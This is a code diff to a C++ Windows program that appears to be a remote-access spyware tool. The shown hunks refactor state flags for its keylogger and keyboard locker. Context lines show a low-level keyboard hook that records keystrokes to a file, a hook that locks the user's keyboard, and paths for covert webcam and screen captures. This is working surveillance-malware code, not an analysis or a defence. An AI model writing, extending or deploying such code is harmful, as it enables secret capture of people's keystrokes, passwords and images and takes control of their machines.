@@ -1,16 +1,18 @@
 #include "utils.h"
 
-ofstream fo;
 stringstream inp, out;
 string requestFilePath;
-string webcamCapturePath = filesystem::current_path().string() + "\\webcam.png";
-string screenCapturePath = filesystem::current_path().string() + "\\screen.png";
-string keyloggerCapturePath = filesystem::current_path().string() + "\\keylogger.txt";
-VideoCapture* cap = nullptr;
-HHOOK hKeyloggerHook = nullptr;
-HHOOK hKeylockerHook = nullptr;
-atomic<bool> keepRunning(false);
-bool isShiftDown = false;
+string webcamCapturePath(filesystem::current_path().string() + "\\webcam.png");
+string screenCapturePath(filesystem::current_path().string() + "\\screen.png");
+string keyloggerCapturePath(filesystem::current_path().string() + "\\keylogger.txt");
+
+ofstream fo;
+VideoCapture* cap(nullptr);
+HHOOK hKeyloggerHook(nullptr);
+HHOOK hKeylockerHook(nullptr);
+atomic<bool> keyloggerRunning(false);
+atomic<bool> keylockerRunning(false);
+bool isShiftDown(false);
 
 unordered_map<int, string> specialKeys = {
     {VK_BACK, "[BACKSPACE]"},
@@ -670,12 +672,12 @@ void startKeylogger() {
             throw runtime_error("Failed to start keylogger");
         }
     
-        keepRunning = true;
+        keyloggerRunning = true;
         thread keyloggerThread([]() {
             hKeyloggerHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyloggerProc, nullptr, 0);
 
             MSG msg;
-            while (keepRunning) {
+            while (keyloggerRunning) {
                 if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
                     TranslateMessage(&msg);
                     DispatchMessageW(&msg);
@@ -698,7 +700,7 @@ void startKeylogger() {
 
 void stopKeylogger() {
     if (hKeyloggerHook) {
-        keepRunning = false;
+        keyloggerRunning = false;
         PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0); // Post a message to wake up the message loop
         fo.close();
         out << "Keylogger stopped successfully.\n\nSee more in file " << getFileName(keyloggerCapturePath);
@@ -794,12 +796,12 @@ LRESULT CALLBACK KeylockerProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 void lockKeyboard() {
     if (!hKeylockerHook) {
-        keepRunning = true;
+        keylockerRunning = true;
         thread keylockerThread([]() {
             hKeylockerHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeylockerProc, nullptr, 0);
 
             MSG msg;
-            while (keepRunning) {
+            while (keylockerRunning) {
                 if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
                     TranslateMessage(&msg);
                     DispatchMessageW(&msg);
@@ -822,7 +824,7 @@ void lockKeyboard() {
 
 void unlockKeyboard() {
     if (hKeylockerHook) {
-        keepRunning = false;
+        keylockerRunning = false;
         PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0); // Post a message to wake up the message loop
         out << "Keyboard unlocked successfully.\n";
     }
